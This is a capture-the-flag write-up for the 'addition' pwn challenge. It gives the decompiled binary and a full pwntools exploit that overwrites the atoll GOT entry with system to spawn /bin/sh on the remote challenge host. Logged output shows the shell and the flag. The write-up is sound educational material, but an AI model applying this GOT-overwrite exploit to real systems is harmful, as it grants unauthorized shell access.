# addition

```
by Eth007
Description

i love addition

nc addition.chal.imaginaryctf.org 1337
Attachments

addition.zip
```

Decompile the executable in [Binary Ninja](https://binary.ninja):

```c
004011e9    int32_t main(int32_t argc, char** argv, char** envp)

004011e9    {
004011e9        void* fsbase;
004011fe        int64_t var_10 = *(uint64_t*)((char*)fsbase + 0x28);
00401213        setbuf(stdin, nullptr);
00401227        setbuf(__TMC_END__, nullptr);
0040123b        setbuf(stderr, nullptr);
0040124a        puts("+++++++++++++++++++++++++++");
00401259        puts("    WELCOME TO ADDITION");
00401268        puts("+++++++++++++++++++++++++++");
00401320        int64_t i;
00401320        
00401320        do
00401320        {
00401281            write(1, "add where? ", 0xb);
00401299            char var_28[0x18];
00401299            fgets(&var_28, 0x10, stdin);
004012a5            i = atoll(&var_28);
004012c2            write(1, "add what? ", 0xa);
004012da            fgets(&var_28, 0x10, stdin);
00401315            *(uint64_t*)(i + &buf) += atoll(&var_28);
00401320        } while (i != 0x539);
0040132d        exit(0);
0040132d        /* no return */
004011e9    }
```

We can add 8 bytes to arbitrary location. So we can:

1. change atoll to point to system in .got.plt section
2. send `/bin/sh` so that `atoll("/bin/sh")` is called, which calls `system("/bin/sh")`

Attack:

```python
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(log_level="debug")

# p = process("./vuln")
p = remote(host="addition.chal.imaginaryctf.org", port=1337)
# gdb.attach(p)
# pause()
addr_offset = libc.symbols["system"] - libc.symbols["atoll"]
buf = elf.symbols["buf"]
atoll = elf.got["atoll"]
index = atoll - buf
p.sendline(str(index).encode())
p.sendline(str(addr_offset).encode())

p.sendline(b"/bin/sh")
p.interactive()
```

Get shell:

```shell
[+] Opening connection to addition.chal.imaginaryctf.org on port 1337: Done
[DEBUG] Sent 0x4 bytes:
    b'-73\n'
[DEBUG] Sent 0x6 bytes:
    b'55024\n'
[DEBUG] Sent 0x8 bytes:
    b'/bin/sh\n'
[*] Switching to interactive mode
[DEBUG] Received 0x1e bytes:
    b'== proof-of-work: disabled ==\n'
== proof-of-work: disabled ==
[DEBUG] Received 0x70 bytes:
    b'+++++++++++++++++++++++++++\n'
    b'    WELCOME TO ADDITION\n'
    b'+++++++++++++++++++++++++++\n'
    b'add where? add what? add where? '
+++++++++++++++++++++++++++
    WELCOME TO ADDITION
+++++++++++++++++++++++++++
add where? add what? add where? $ ls -al
[DEBUG] Sent 0x7 bytes:
    b'ls -al\n'
[DEBUG] Received 0xd8 bytes:
    b'total 32\n'
    b'drwxr-xr-x 2 nobody nogroup  4096 Jun 18 05:40 .\n'
    b'drwxr-xr-x 3 nobody nogroup  4096 Jun 18 05:40 ..\n'
    b'-r-xr-xr-x 1 nobody nogroup 16448 Jun 18 05:36 chal\n'
    b'-rw-r--r-- 1 nobody nogroup    42 Jun 18 05:40 flag.txt\n'
total 32
drwxr-xr-x 2 nobody nogroup  4096 Jun 18 05:40 .
drwxr-xr-x 3 nobody nogroup  4096 Jun 18 05:40 ..
-r-xr-xr-x 1 nobody nogroup 16448 Jun 18 05:36 chal
-rw-r--r-- 1 nobody nogroup    42 Jun 18 05:40 flag.txt
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x2a bytes:
    b'ictf{i_love_finding_offsets_4fd29170cb90}\n'
ictf{i_love_finding_offsets_4fd29170cb90}
$
```